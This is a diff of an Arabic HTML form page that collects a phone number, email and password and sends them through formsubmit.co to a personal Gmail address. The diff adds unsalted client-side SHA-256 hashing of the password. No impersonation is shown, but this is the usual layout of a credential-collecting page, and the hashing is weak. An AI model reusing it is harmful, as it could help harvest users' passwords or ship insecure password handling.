@@ -2,38 +2,90 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>نموذج التسجيل</title>
+  <title>نموذج إرسال البيانات</title>
   <style>
-    body { font-family: 'Arial'; text-align: center; padding: 50px; background-color: #f9f9f9; }
-    form { background: #fff; padding: 25px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-    input, textarea { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
-    button { padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
-    button:hover { background-color: #0056b3; }
+    body {
+      font-family: 'Arial';
+      text-align: center;
+      padding: 40px;
+      background-color: #f9f9f9;
+    }
+    form {
+      background: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      direction: rtl;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
   </style>
 </head>
 <body>
 
-  <h2>نموذج التسجيل</h2>
+  <h2>نموذج تسجيل البيانات</h2>
 
-  <form action="https://formsubmit.co/yblyyll@gmail.com" method="POST">
+  <form id="secureForm" action="https://formsubmit.co/yblyyll@gmail.com" method="POST">
     
-    <!-- رقم الهاتف -->
     <input type="tel" name="رقم_الهاتف" placeholder="رقم الهاتف" required>
+    
+    <input type="email" name="البريد_الإلكتروني" placeholder="البريد الإلكتروني" required>
+    
+    <!-- كلمة المرور (لن ترسل مباشرة) -->
+    <input type="password" id="rawPassword" placeholder="كلمة المرور" required>
 
-    <!-- كلمة المرور -->
-    <input type="password" name="كلمة_المرور" placeholder="كلمة المرور" required>
+    <!-- كلمة المرور المشفرة -->
+    <input type="hidden" name="كلمة_المرور" id="hashedPassword">
 
-    <!-- البريد المستلم (ثابت ومخفي) -->
-    <input type="hidden" name="_cc" value="yblyyll@gmail.com">
-
-    <!-- منع سبام -->
+    <!-- منع السبام -->
     <input type="text" name="_honey" style="display:none">
-
-    <!-- لا يتم إعادة التوجيه -->
+    
+    <!-- إعادة التوجيه بعد الإرسال -->
     <input type="hidden" name="_redirect" value="thanks.html">
 
-    <button type="submit">إرسال البيانات</button>
+    <button type="submit">إرسال</button>
   </form>
+
+  <script>
+    document.getElementById("secureForm").addEventListener("submit", async function(event) {
+      event.preventDefault();
+      const rawPass = document.getElementById("rawPassword").value;
+
+      // تشفير SHA-256
+      const encoder = new TextEncoder();
+      const data = encoder.encode(rawPass);
+      const hashBuffer = await crypto.subtle.digest("SHA-256", data);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+
+      // تعبئة كلمة المرور المشفرة
+      document.getElementById("hashedPassword").value = hashHex;
+
+      // إزالة كلمة المرور الأصلية من النموذج
+      document.getElementById("rawPassword").disabled = true;
+
+      // إرسال النموذج
+      event.target.submit();
+    });
+  </script>
 
 </body>
 </html>
